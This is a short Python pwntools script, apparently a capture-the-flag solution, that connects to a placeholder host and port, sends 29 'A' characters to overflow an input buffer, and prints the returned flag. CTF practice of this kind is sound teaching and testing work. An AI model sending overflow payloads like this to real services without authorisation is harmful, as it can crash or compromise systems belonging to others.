from pwn import *

host = 'HOST_HERE'
port = PORT_HERE

payload = 'A' * 29 #Overflowing the buffer with 29 A's

connect = remote(host,port) #Connecting to the remote server
connect.sendlineafter('Input: ', payload) #Waiting until we recieve "Input" and sending the payload
output = connect.recvall()
print(output) #Displaying our flag
